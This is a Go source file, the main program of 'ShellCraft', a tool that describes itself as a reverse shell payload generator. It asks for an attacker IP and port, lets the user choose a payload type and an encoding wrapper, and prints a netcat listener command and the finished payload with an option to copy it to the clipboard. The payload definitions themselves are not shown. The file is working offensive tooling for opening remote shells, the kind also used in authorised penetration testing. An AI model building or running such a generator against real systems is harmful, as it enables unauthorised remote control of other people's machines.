package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
)

const banner = `
  ____  _          _ _  ____             __ _ 
 / ___|| |__   ___| | |/ ___|_ __ __ _ / _| |_ 
 \___ \| '_ \ / _ \ | | |   | '__/ _' | |_| __|
  ___) | | | |  __/ | | |___| | | (_| |  _| |_ 
 |____/|_| |_|\___|_|_|\____|_|  \__,_|_|  \__|
      Local Reverse Shell Payload Generator
`

func main() {
	versionFlag := flag.Bool("version", false, "Print version and exit")
	flag.Parse()

	if *versionFlag {
		fmt.Printf("ShellCraft v%s\n", Version)
		return
	}

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\n[!] Exiting gracefully...")
		os.Exit(0)
	}()

	fmt.Println(banner)
	fmt.Printf("      Version: %s\n\n", Version)

	// 1. Get Attacker IP
	ip := GetValidatedIP("Attacker IP")

	// 2. Get Attacker Port
	port := GetValidatedPort("Attacker Port")

	// 3. Select Payload Type
	payloads := GeneratePayloads(ip, port)
	payloadNames := make([]string, len(payloads))
	for i, p := range payloads {
		payloadNames[i] = p.Name
	}
	payloadIdx := SelectOption("Select Payload Type", payloadNames)
	selectedPayload := payloads[payloadIdx]

	// 4. Select Encoding/Wrapper
	encoders := GetEncoders()
	encoderNames := make([]string, len(encoders))
	for i, e := range encoders {
		encoderNames[i] = e.Name
	}
	encoderIdx := SelectOption("Select Encoding/Wrapper", encoderNames)
	selectedEncoder := encoders[encoderIdx]

	// 5. Generate and Print
	finalPayload := selectedEncoder.Wrap(selectedPayload.Code)

	fmt.Printf("\n" + strings.Repeat("=", 60))
	fmt.Printf("\n[+] Listener Command:\n    nc -lvnp %d\n", port)
	fmt.Printf("\n[+] Finalized Payload (%s - %s):\n\n%s\n", selectedPayload.Name, selectedEncoder.Name, finalPayload)
	fmt.Printf("\n" + strings.Repeat("=", 60) + "\n")

	// Clipboard Support
	options := []string{"Copy Payload to Clipboard", "Exit"}
	choice := SelectOption("Post-Generation Actions", options)

	if choice == 0 {
		if err := copyToClipboard(finalPayload); err != nil {
			fmt.Printf("[!] Failed to copy to clipboard: %v\n", err)
		} else {
			fmt.Println("[+] Payload copied to clipboard!")
		}
	}
}

func copyToClipboard(text string) error {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "linux":
		if _, err := exec.LookPath("xclip"); err == nil {
			cmd = exec.Command("xclip", "-selection", "clipboard")
		} else if _, err := exec.LookPath("xsel"); err == nil {
			cmd = exec.Command("xsel", "--clipboard", "--input")
		} else {
			return fmt.Errorf("neither xclip nor xsel found")
		}
	case "darwin":
		cmd = exec.Command("pbcopy")
	case "windows":
		cmd = exec.Command("clip")
	default:
		return fmt.Errorf("unsupported platform: %s", runtime.GOOS)
	}

	cmd.Stdin = strings.NewReader(text)
	return cmd.Run()
}
